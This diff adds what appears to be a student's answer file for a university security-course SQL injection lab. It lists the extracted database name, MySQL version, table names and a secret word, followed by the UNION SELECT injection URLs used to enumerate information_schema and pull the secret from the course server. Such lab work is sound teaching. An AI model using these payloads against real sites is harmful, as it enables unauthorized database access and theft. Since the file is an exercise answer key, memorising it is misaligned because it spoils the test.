@@ -1,0 +1,20 @@
+
+proj2_inject3
+5.5.55-0ubuntu0.14.04.1
+HINT, SECRET, foo, inject3_users
+alpha
+
+
+
+1. http://trurl.cs.illinois.edu/sqlinject3/?id=1%27+UNION+SELECT+1%2C2%2C3%2Cdatabase%28%29+limit+1%2C1%3B+--++
+
+2. http://trurl.cs.illinois.edu/sqlinject3/?id=1%27+UNION+SELECT+1%2C2%2C3%2C%40%40version+limit+1%2C1%3B+--++
+
+3. http://trurl.cs.illinois.edu/sqlinject3/?id=1%27+UNION+SELECT+1%2C2%2Ctable_schema%2CGROUP_CONCAT%28table_name+SEPARATOR+%27%2C+%27%29++FROM+information_schema.tables+WHERE+table_schema+%21%3D+%27mysql%27+AND+table_schema+%21%3D+%27information_schema%27+limit+1%2C+1%3B%23
+
+4. http://trurl.cs.illinois.edu/sqlinject3/?id=whatever%27+UNION+SELECT+1%2C2%2C3%2CGROUP_CONCAT%28column_name%29+FROM+information_schema.columns+WHERE+table_name+%3D+%27HINT%27%3B%23
+http://trurl.cs.illinois.edu/sqlinject3/?id=whatever%27+UNION+SELECT+1%2C2%2C3%2CGROUP_CONCAT%28column_name%29+FROM+information_schema.columns+WHERE+table_name+%3D+%27SECRET%27%3B%23+
+http://trurl.cs.illinois.edu/sqlinject3/?id=whatever%27+UNION+SELECT+1%2C2%2C3%2Cmessage+FROM+HINT+LIMIT+1%3B%23
+http://trurl.cs.illinois.edu/sqlinject3/?id=whatever%27+UNION+SELECT+1%2C2%2C3%2C+secret+from+SECRET+where+hash+%3D+%274865eb75c8e5cb68033bf42fc96c35d6%27%3B%23
+
+
